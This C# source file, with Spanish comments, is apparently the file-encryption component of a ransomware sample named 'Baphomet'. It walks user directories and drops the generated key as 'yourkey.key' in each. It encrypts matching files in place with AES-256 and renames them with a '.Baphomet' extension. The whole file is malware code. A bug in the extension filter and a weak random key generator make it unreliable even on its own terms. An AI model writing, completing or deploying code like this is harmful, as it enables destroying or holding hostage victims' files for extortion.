using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;

namespace Baphomet
{
    public class Cryptep
    {
        //Genero un password aleatorio.
        public string GenerateKey()
        {
            int length = 15;
            var validated = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/";
            StringBuilder res = new StringBuilder();
            Random rnd = new Random();
            while (0 < length--)
            {
                res.Append(validated[rnd.Next(validated.Length)]);
            }
            return res.ToString();
        }

        //recoro los directorios
        public void directoryRoad(string userdir, string key, string[] Dirs)
        {
            var extensionCheck = new[] { ".txt, .png" };//Extensiones validas

            for (int d = 0; d < Dirs.Length; d++)//recoro cada uno de los dirs validos
            {
                var targetPath = userdir + Dirs[d];
                File.WriteAllText(targetPath + "\\yourkey.key", key);//escribo la llave en cada uno de los directorios

                string[] files = Directory.GetFiles(targetPath);
               // string[] subDirs = Directory.GetDirectories(targetPath);

                for(int i = 0; i < files.Length; i++)
                {
                    var extension = Path.GetExtension(files[i]);
                    if (extensionCheck.Contains(extension))
                    {
                        encryptFileData(files[i], key, targetPath);
                    }
                }
             }
        }

         //archivo valido para cifrar bytes
        static void encryptFileData(string file, string key, string targetPath)
        {
            byte[] encryptFileBites = File.ReadAllBytes(file);
            byte[] passwordBytes = Encoding.UTF8.GetBytes(key);
            passwordBytes = SHA256.Create().ComputeHash(passwordBytes);

            var encryptedBytes = UseAES(encryptFileBites, passwordBytes);
            File.WriteAllBytes(file, encryptedBytes);
            System.IO.File.Move(file, file + ".Baphomet");

            //var saveKey = Convert.ToBase64String(key,0,key.Length);
           // File.WriteAllText(targetPath+"\\yourkey.txt", saveKey);

        }

        //Cifro los bytes de el archivo
        static byte[] UseAES(byte[] fileBytes, byte[] passw)
        {
            byte[] encryptedBytes = null;
            byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };

            using (MemoryStream ms = new MemoryStream())
            {
                using (SymmetricAlgorithm aes = new AesManaged())
                {
                    aes.KeySize = 256;
                    aes.BlockSize = 128;

                    var key = new Rfc2898DeriveBytes(passw, saltBytes, 1000);

                   aes.Key = key.GetBytes(aes.KeySize / 8);
                   aes.IV = key.GetBytes(aes.BlockSize / 8);
                   aes.Mode = CipherMode.CBC;

                    using (var cryptStream = new CryptoStream(ms, aes.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        cryptStream.Write(fileBytes, 0, fileBytes.Length);
                        cryptStream.Close();
                    }
                    encryptedBytes = ms.ToArray();
                }
                return encryptedBytes;
            }
        }
       
    }
}